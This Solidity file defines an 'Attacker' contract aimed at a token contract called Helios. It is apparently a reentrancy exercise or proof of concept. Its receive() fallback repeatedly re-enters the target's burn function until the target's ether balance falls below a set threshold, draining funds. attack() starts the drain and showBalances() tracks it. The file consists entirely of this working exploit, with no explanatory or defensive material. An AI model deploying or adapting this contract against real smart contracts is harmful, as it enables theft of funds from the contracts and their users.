// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IHelios {
    function burn(address _recipient, uint256 _amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(address _recipient, uint256 _amount) external returns (bool);
}

contract Attacker {
    IHelios public immutable Hel;
    uint256 threshold;
    uint256 myTokens;

    constructor(IHelios _Helios) payable { // Made payable to initialize with balance
        Hel = _Helios;
        threshold = 0;
    }

    receive() external payable {
        myTokens = Hel.balanceOf(address(this));
        if ((threshold > 0) && (address(Hel).balance) >= (threshold * 1e18)) { // threshold in ether
            Hel.burn(address(this), myTokens);
        }
    }

    // attack() assumes preexisting balance of self
    function attack(uint256 _threshold) public payable {
        threshold = _threshold;
        myTokens = Hel.balanceOf(address(this));
        Hel.burn(address(this), myTokens);
        threshold = 0;
    }

    function showBalances() public view returns (uint256 self, uint256 hel){
        return (address(this).balance, address(Hel).balance);
    }

}
